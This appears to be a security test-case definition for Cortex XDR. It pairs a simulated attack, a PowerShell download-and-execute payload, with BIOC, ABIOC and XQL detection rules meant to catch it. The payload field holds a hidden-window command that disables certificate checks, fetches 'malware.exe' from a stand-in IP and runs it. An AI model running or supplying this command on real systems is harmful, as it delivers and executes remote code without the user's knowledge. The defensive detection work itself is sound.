identity.name: Windows CGO with Anomalous Actor Process Behavior
identity.summary: An attacker uses a malicious PowerShell script to download and execute a remote payload, followed by a suspicious process injection technique. Cortex should detect the anomalous characteristics of the
identity.description: An attacker uses a malicious PowerShell script to download and execute a remote payload, followed by a suspicious process injection technique. Cortex should detect the anomalous characteristics of the actor process and the action module.

payload.code: powershell.exe -WindowStyle Hidden -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.50/malware.exe', 'C:\temp\malware.exe'); Start-Process -FilePath 'C:\temp\malware.exe' -WindowStyle Hidden"

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Suspicious PowerShell Execution
biocs.description: PowerShell process starts with hidden window and downloads file from external IP
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter process_command_line contains 'Hidden' and process_command_line contains 'DownloadFile'
| filter action_remote_ip = '192.0.2.50'

abiocs.name: Anomalous CGO Process Behavior
abiocs.description: PowerShell process performs suspicious download and execution without user interaction
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_file_path = 'C:\temp\malware.exe'
| filter action_remote_ip = '192.0.2.50'
| filter process_command_line contains 'Hidden' and process_command_line contains 'DownloadFile'
| filter causality_actor_process_image_name = 'powershell.exe'

xql_queries.name: Detect Suspicious PowerShell Activity
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter process_command_line contains 'DownloadFile'
| filter action_remote_ip = '192.0.2.50'
